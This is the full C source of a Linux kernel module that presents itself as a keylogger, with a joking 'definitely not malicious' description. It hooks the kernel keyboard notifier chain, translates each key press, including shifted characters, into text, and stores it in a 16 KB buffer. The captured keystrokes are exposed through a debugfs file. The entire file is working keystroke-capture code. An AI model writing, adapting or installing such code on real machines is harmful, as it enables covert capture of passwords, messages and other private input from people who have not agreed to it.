/* This is a linux kernel keylogger that writes to /sys/kernel/debug/keylog/keylog
* 
*
*/


#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#define BUF_LEN (PAGE_SIZE << 2) // 16 KB buffer size
#define KC_LEN 12 // encoded keycode length

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jeffrey Lee");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("A very safe and definitely not malicious keylogger");

static struct dentry* file;
static struct dentry* subdir;

static ssize_t keys_read(struct file* ilp, char* buf, size_t len, loff_t* offset);

static int keylogger_callback(struct notifier_block* keylogger_block, unsigned long code, void* _param);

/*
* char keycodes taken from usr/include/linux/input-event-codes.h and stored in a 2D array
* many keycodes are written as \0 because they are not on the typical keyboard
* in the US, such as keys that facilitate typing in Japanese or Korean.
* Goes from 0 - 83 in order listed from the file, could add all of the keycodes, 
* but I chose to end here because these encapsulates most of the common keys
*/

static const char* keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, 
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, //these are numpad numbers
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 
	{"_KPD._", "_DEL_"},                                       
};

static size_t buf_position;
static char keys_buf[BUF_LEN];

const struct file_operations keys_file_ops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

/*
* simple_read_from_buffer is a wrapper for copy()
*/
static ssize_t keys_read(struct file* filp, char *buf, size_t len, loff_t* offset) {

	return simple_read_from_buffer(buf, len, offset, keys_buf, buf_position);
}

static struct notifier_block keylogger_block = {

	.notifier_call = keylogger_callback,
};

// converts keycode into readable string, and saves to buffer

void keycode_to_string(int keycode, int shiftPress, char* buf) {
	if( keycode > KEY_RESERVED && keycode <= KEY_KPDOT) { //values 0 - 83
		const char* key = (shiftPress == 1) ? keymap[keycode][1] : keymap[keycode][0]; //if shift is held down, capitalize or alt char
		snprintf(buf, KC_LEN, "%s", key);
	}
}

/*
* called when a key is pressed down
* reads from keyboard-notifier, after register_keyboard_notifier is called
* the struct keybard_notifier_param is in /linux/keyboard.h
*/

int keylogger_callback(struct notifier_block* keylogger_block, unsigned long code, void* _param) {
	size_t len;
	char key_buffer[KC_LEN] = {0};
	struct keyboard_notifier_param* param = _param;

	if(!(param->down)) {
		return NOTIFY_OK;
	}

	keycode_to_string(param->value, param->shift, key_buffer);
	len = strlen(key_buffer);

	if(len < 1) {
		return NOTIFY_OK; //checks for unmapped keycode
	}

	//prevents buffer overflow
	if ((buf_position + len) >= BUF_LEN) {
		buf_position = 0;
	}

	strncpy(keys_buf + buf_position, key_buffer, len);
	buf_position += len;

	return NOTIFY_OK;
}

/*
* keylogger  init function
*/
static int __init keylogger_init(void) {
	subdir = debugfs_create_dir("keylog", NULL);

	if (IS_ERR(subdir)) {
		return PTR_ERR(subdir);
	}

	if (!subdir) {
		return -ENOENT;
	}

	file = debugfs_create_file("keylog", 0400, subdir, NULL, &keys_file_ops);

	//check for invalid file
	if(!file) {
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}
	/*
	* adds to the list of keyboard event notifiers, 
	* so this function is called when a key is pressed
	*/

	register_keyboard_notifier(&keylogger_block);
	return 0;
}

/*
* keylogger exit function
*/

static void __exit keylogger_exit(void) {
	unregister_keyboard_notifier(&keylogger_block);
	debugfs_remove_recursive(subdir);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
